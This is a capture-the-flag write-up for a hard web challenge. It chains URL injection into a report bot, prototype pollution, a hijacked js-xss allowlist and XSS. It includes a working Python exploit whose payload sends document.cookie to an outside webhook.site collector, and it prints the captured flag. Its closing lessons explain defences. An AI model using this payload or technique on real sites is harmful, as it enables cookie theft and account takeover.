# Valley Forums — web, hard — 1000 pts

**Flag:** `HTB{i7_b3c4m3_wh4t_1t_sw0r3_t0_d3str0y}`

Express + nunjucks (autoescape on) + a Puppeteer report bot + `js-xss` for sanitisation + SQLite.
A four-link chain: URL injection → client-side prototype pollution → sanitiser takeover → XSS.

The flag text is the giveaway in hindsight — the *sanitiser* becomes the attack.

---

## Link 1 — URL injection into the bot

`routes/index.js`:

```js
router.post('/api/report', (req, res) => {
  const { id } = req.body;
  if (isNaN(parseInt(id))) return res.status(400).json(...);   // weak check
  bot.visitPost(id);                                           // raw id
});
```

and in the bot:

```js
await page.goto('http://127.0.0.1:1337/posts/' + id);
```

`parseInt("1?foo=bar")` is `1`, so `isNaN` passes — but the **raw string** is concatenated into the
URL. Supplying `id = "1?<query>"` gives us full control of the query string on a page the
*authenticated bot* loads.

Validation and use must operate on the same value. Here validation coerces and use does not.

## Link 2 — prototype pollution in the query parser

`forum.js` runs on every page load:

```js
window.onload = () => { const params = parseParams(location.href); ... }
```

`parseParams.js` builds nested objects from dotted keys and recurses with **no `__proto__` guard**:

```js
function createElement(obj, path, value) {
  const key = path.shift();
  if (!path.length) { obj[key] = value; return; }
  if (!obj[key]) obj[key] = {};
  createElement(obj[key], path, value);      // walks straight into __proto__
}
```

So `?__proto__.whiteList.img[0]=src` writes `Object.prototype.whiteList`.

## Link 3 — js-xss inherits the polluted config

`sanitize()` calls `filterXSS(input)` with **no options object**. Inside `js-xss`:

```js
function FilterXSS(options) {
  options = shallowCopyObject(options || {});          // for..in -> copies INHERITED props
  options.whiteList = options.whiteList || options.allowList || DEFAULT.whiteList;
}
```

`shallowCopyObject` is a `for..in` loop, which enumerates prototype properties. `{}` therefore
arrives carrying our polluted `whiteList`, and the `||` chain prefers it over the library default.

**We now define the allowlist.** Granting `img` the attributes `src` and `onerror` is enough:

```
?__proto__.whiteList.img[0]=src&__proto__.whiteList.img[1]=onerror
```

## Link 4 — the sink

```js
$('#search-msg').innerHTML = `Search results for "${sanitize(params.search)}" :`;
```

`innerHTML` with a value our own allowlist just approved.

## Assembling it — three gotchas that each cost a cycle

1. **`safeAttrValue` blanks the attribute** unless the value starts with `http(s)://`, `//`, `/`,
   `./`, `#`, etc. `src=x` is stripped. Use **`src=/`** — it is allowed, returns HTML rather than an
   image, and therefore reliably fires `onerror`.
2. **Single quotes break js-xss's attribute parser** and cause the whole tag to be escaped. Use
   **backticks** for every string in the payload. Only `<`, `>` and `"` are escaped in attribute
   values, so backticks, parentheses and dots pass through untouched.
3. **`parseParams` does `replace(/\+/g, ' ')`**, so any literal `+` in the payload must be `%2B`
   (or avoided entirely with template literals / `.concat`).

`bot.js` sets the flag as a **non-`httpOnly`** cookie on `127.0.0.1:1337`, so `document.cookie`
reaches it.

```python
import urllib.parse, json, urllib.request

TOK = "<webhook.site token>"
payload = ("<img src=/ onerror=fetch(`https://webhook.site/%s/?c=`"
           "+encodeURIComponent(document.cookie))>" % TOK)

ident = ("1?__proto__.whiteList.img%5B0%5D=src"
         "&__proto__.whiteList.img%5B1%5D=onerror"
         "&search=" + urllib.parse.quote(payload, safe=''))

req = urllib.request.Request(
    f"http://{HOST}:{PORT}/api/report",
    data=json.dumps({"id": ident}).encode(),
    headers={"Content-Type": "application/json"})
print(urllib.request.urlopen(req).read().decode())
```

Callback arrives from `HeadlessChrome/99`, referer `http://127.0.0.1:1337/`:

```
?c=flag%3DHTB%7Bi7_b3c4m3_wh4t_1t_sw0r3_t0_d3str0y%7D
```

---

## Lessons

- **Validate and use the same value.** `isNaN(parseInt(x))` then using raw `x` is a type-coercion
  gap that shows up constantly — in IDs, ports, and amounts.
- **`for..in` copies inherited properties.** Any library that shallow-copies an options object this
  way is one prototype pollution away from having its security configuration rewritten. `Object.assign`,
  `structuredClone`, or `Object.create(null)` avoid it.
- **Prototype pollution is rarely the payload — it is the pivot.** Here it did no direct harm; it
  disarmed the sanitiser, and the sanitiser was the only thing standing between user input and
  `innerHTML`.
- Defence in depth would have held: `Object.freeze(Object.prototype)`, a `__proto__` denylist in the
  parser, passing an explicit `whiteList` to `filterXSS`, `textContent` instead of `innerHTML`, or
  `httpOnly` on the flag cookie — **any one** of these breaks the chain.
